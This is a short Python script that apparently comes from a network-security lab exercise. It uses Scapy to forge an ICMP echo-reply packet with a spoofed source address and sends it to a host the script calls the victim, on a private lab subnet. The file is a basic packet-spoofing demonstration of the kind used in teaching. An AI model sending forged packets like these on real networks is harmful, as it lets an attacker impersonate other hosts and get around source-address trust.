#!/usr/bin/env python3
from scapy.all import *

victim_ip = "192.168.56.101"
pretend_to_be = "192.168.56.102"   # spoofed source

ip = IP(src=pretend_to_be, dst=victim_ip)
icmp = ICMP(type=0)  # Echo-reply

packet = ip/icmp

print("[+] Sending spoofed ICMP reply...")
send(packet, verbose=False)
print("[+] Packet sent")
